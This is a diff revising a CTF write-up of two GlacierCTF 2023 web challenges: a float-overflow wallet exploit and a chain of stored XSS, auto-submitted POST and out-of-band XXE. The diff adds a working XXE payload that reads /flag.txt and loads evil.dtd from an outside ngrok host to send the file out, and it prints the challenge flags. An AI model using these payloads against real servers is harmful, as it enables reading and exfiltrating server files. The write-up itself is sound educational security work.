@@ -13,11 +13,6 @@ description: CTF - GlacierCTF 2023
 Welcome to another CTF writeup. This time I played GlacierCTF 2023, and I focused on the Web challenges. We participate as [ISwearGoogledIt](https://ctftime.org/team/109689) with [RazviOverflow](https://razvioverflow.github.io/), [Bubu](https://albertofdr.github.io/) and [liti0s](https://ctftime.org/user/73060). Let's dive into the challenges!  
 
 <p align="center">
-  <img src="/images/writeups/GlacierCTF2023/logo.png" width="35%"/>
-</p>
-
-
-<p align="center">
   <img src="/images/writeups/GlacierCTF2023/banner.png" width="85%"/>
 </p>
 
@@ -25,6 +20,10 @@ Welcome to another CTF writeup. This time I played GlacierCTF 2023, and I focuse
 
 Challenge index:
 
+### Web
+
+- [Glacier Exchange](#glacier-exchange)
+- [Peak](#peak)
 
 
 <br>
@@ -41,9 +40,9 @@ We have launched a new revolutionary exchange tool, allowing you to trade on the
 
 authors: hweissi & xsskevin
 
-https://glacierexchange.web.glacierctf.com
+[https://glacierexchange.web.glacierctf.com](https://glacierexchange.web.glacierctf.com)
 
-We are provided with the server code.
+_Source code was provided for this challenge._
 
 The website is a simulator of an exchange site, where we start with 1000 cashout.
 
@@ -51,10 +50,9 @@ The website is a simulator of an exchange site, where we start with 1000 cashout
   <img src="/images/writeups/GlacierCTF2023/1_0_website.png" width="85%"/>
 </p>
 
-The objective, as seen in the code, is to obtain 1000000000 cashout coins:
+The objective, as seen in the code, was to obtain 1000000000 cashout coins:
 
 ```python
-
 # server.py
 @app.route("/api/wallet/join_glacier_club", methods=["POST"])
 def join_glacier_club():
@@ -87,7 +85,6 @@ def inGlacierClub(self):
 To do so, we have some API calls to exchange coins between each other, the point here is that the exchange is 1:1:
 
 ```python
-
 # server.py
 @app.route('/api/wallet/transaction', methods=['POST'])
 def transaction():
@@ -142,12 +139,12 @@ class Wallet():
             return True
 ```
 
-The trick here is how the balance change is done:
+The trick here is how the balance exchange is done:
 - We have the _threading.lock()_ so we can forget about any race conditions to overcome this problem.
 - The balance input is casted into float _float(payload["balance"])_
 - We can exchange a coin to the same coin
 
-We can play with float overflow in this case, the sequence will be the following one:
+We can play with float overflow in this case, the sequence to exploit will be as follows:
 
 ```python
 # First bustract -inf to get infinite money
@@ -173,7 +170,7 @@ And we can see the NaN on the cashout balance:
 </p>
 
 
-Then we can call the API to get the flag within the Glacier Club:
+Then, we can call the API to get the flag within the Glacier Club:
 
 <p align="center">
   <img src="/images/writeups/GlacierCTF2023/1_1_flag.png" width="85%"/>
@@ -183,7 +180,7 @@ Then we can call the API to get the flag within the Glacier Club:
 ``` gctf{PyTh0N_CaN_hAv3_Fl0At_0v3rFl0ws_2} ``` 
 
 
-
+<br>
 
 ## Peak
 227
@@ -191,9 +188,9 @@ Within the heart of Austria's alpine mystery lies your next conquest. Ascend the
 
 author: Chr0x6eOs
 
-https://peak.web.glacierctf.com
+[https://peak.web.glacierctf.com](https://peak.web.glacierctf.com)
 
-The source code is provided for this challenge.
+_Source code was provided for this challenge._
 
 We land into an static website with information. With a quick look, we locate the conteact form. To submit, we need to be registered, so we did.
 
@@ -203,20 +200,21 @@ We land into an static website with information. With a quick look, we locate th
 
 We started by checking the source code. Some parts catched our attention:
 
-- Admin visits out message using Selenium Webdrive with chrome @ _/admin/support.php_
+- Admin visits out message using Selenium Webdriver with chrome @ _/admin/support.php_
 - XSS on the message sent to the admin @ _/pages/view_message.php_
 - An XML External Entity injection vulnerability @ _/admin/map.php_
 - Flag on /flag.txt
 
-
+These are the pieces of code affected by aforementiones vulnerabilities:
 
 ```php
 # XXE on /admin/map.php
+# - snip - #
 function parseXML($xmlData){
     try
     {
-        libxml_disable_entity_loader(false);
-        $xml = simplexml_load_string($xmlData, 'SimpleXMLElement', LIBXML_NOENT);
+        libxml_disable_entity_loader(false); # Allows to load external entities
+        $xml = simplexml_load_string($xmlData, 'SimpleXMLElement', LIBXML_NOENT); # Allows subtitution of entities
         return $xml;
     }
     catch(Exception $ex)
@@ -225,13 +223,16 @@ function parseXML($xmlData){
     }
     return true;
 }
+# - snip - #
+
 
 # XSS on /pages/view_message.php
+# - snip - #
 <section id="message" class="py-5">
     <div class="container mt-5">
         <?php if (isset($message)): ?>
             <h1><?php echo htmlentities($message['title']);?></h1>
-            <p><?php echo $message['content']; ?>
+            <p><?php echo $message['content']; ?> # No filtering in the message content
             <?php if($message['file'] !== "") : ?>
                 <div>
                 <img name="image" src="<?php echo $message['file']?>">
@@ -240,10 +241,14 @@ function parseXML($xmlData){
         <?php endif; ?></p>
     </div>
 </section>
+# - snip - #
 ```
+
+Bot visiting the messages:
 
 ```python
 # admin.py
+...
 def read_messages(self):
 
     print(f'[{datetime.now()}] Checking messages...')
@@ -267,24 +272,24 @@ def read_messages(self):
                     '''Timeout or other exception occurred on url.
                     '''
                     print(f'[{datetime.now()}] Error after visiting: {link} (Current URL: {self.driver.current_url}). Error: {ex}\r\n')
-        
+...
 ```
 
-For this challenge I count on [Bubu](https://albertofdr.github.io/) to perform the XSS playload for this challenge. The idea is to get the admin to send a POST request to the _map.php_ with our XXE payload to exfiltrate the flag. These were the steps:
+[Bubu](https://albertofdr.github.io/) and I worked on this challenge together. The idea is get the admin to send a POST request to the _map.php_ with our XXE payload to exfiltrate the flag. These were the steps:
 
 
-1. Create the redirection to our server with the POST payload and send it to the admin. For this we used [ngrok](https://ngrok.com/) to make localhost accessible from the internet. To make this redirection we used the following meta tag:
+1 - Create the redirection to our server with the POST payload and send it to the admin. For this we used [ngrok](https://ngrok.com/) to make localhost accessible from the internet. To make this redirection we used the following meta tag:
 
 ```html
 <meta http-equiv="refresh" content="0; url=https://3f56-92-56-131-173.ngrok-free.app/html.html">
 ```
 
-2. Create an HTML with an script to send the POST data to _map.php_
+2 - Create an HTML with an script to send the POST data to _map.php_, the value of the data field will be a XXE payload one-liner.
 
 ```html
 <html>
-    <form id="sad" action="https://peak.web.glacierctf.com/admin/map.php" method="POST">
-        <input type="text" name="data" value=''/>
+    <form id="sad" action="https://peak.web.glacierctf.com/admin/map.php" method="POST"> <!-- We explain the XXE in the next step -->
+        <input type="text" name="data" value='<!DOCTYPE data [<!ENTITY % file SYSTEM "php://filter/read=convert.base64-encode/resource=file:///flag.txt"><!ENTITY % dtd SYSTEM "https://3f56-92-56-131-173.ngrok-free.app/evil.dtd"> %dtd; %send;]><markers><marker><lat>47.0748663672</lat><lon>12.695247219</lon><name>test</name></marker></markers>'/>
         <input type="submit" value="save"/>
     </form>
     <script>
@@ -294,7 +299,7 @@ For this challenge I count on [Bubu](https://albertofdr.github.io/) to perform t
 </html>
 ```
 
-3. Create an XXE Out-of-band payload to exfiltrate the flag. For this we used a payload that loads the external DTD from our server that we used to send the file content to our server:
+3 - Create an XXE Out-of-band payload to exfiltrate the flag. For this, we used a payload that loads the external DTD from our server, then the DTD will exfiltrate the flag in base64 format. We called %send since it is the entity on our evil.dtd file:
 
 ```xml
 <!-- Payload to send to the POST on map.php -->
@@ -320,7 +325,7 @@ For this challenge I count on [Bubu](https://albertofdr.github.io/) to perform t
 <!DOCTYPE data [<!ENTITY % file SYSTEM "php://filter/read=convert.base64-encode/resource=file:///flag.txt"><!ENTITY % dtd SYSTEM "https://3f56-92-56-131-173.ngrok-free.app/evil.dtd"> %dtd; %send;]><markers><marker><lat>47.0748663672</lat><lon>12.695247219</lon><name>test</name></marker></markers>
 ```
 
-To exfiltrate the flag we used webhook.site, but we could also use the ngrok URL. External DTD:
+4 - To exfiltrate the flag we used webhook.site, but we could also use the ngrok URL. The external DTD will use the %file entity from the XML payload, which will contain the flag encoded with base64 once loaded:
 
 ```xml
 <!-- evil.dtd entity hosted on our server -->
@@ -330,7 +335,7 @@ To exfiltrate the flag we used webhook.site, but we could also use the ngrok URL
 
 ```
 
-4. Create the server and expose the port
+5 - Create the server and expose the port
 
 
 ```bash
@@ -373,9 +378,10 @@ Request:
 Flag:
 
 <p align="center">
-  <img src="/images/writeups/GlacierCTF2023/2_1_flag.png" width="85%"/>
+  <img src="/images/writeups/GlacierCTF2023/2_1_flag.png" width="95%"/>
 </p>
 
 
 ``` gctf{Th3_m0unt4!n_t0p_h4s_th3_b3st_v!3w} ```
 
+This was short, I hope you liked it!
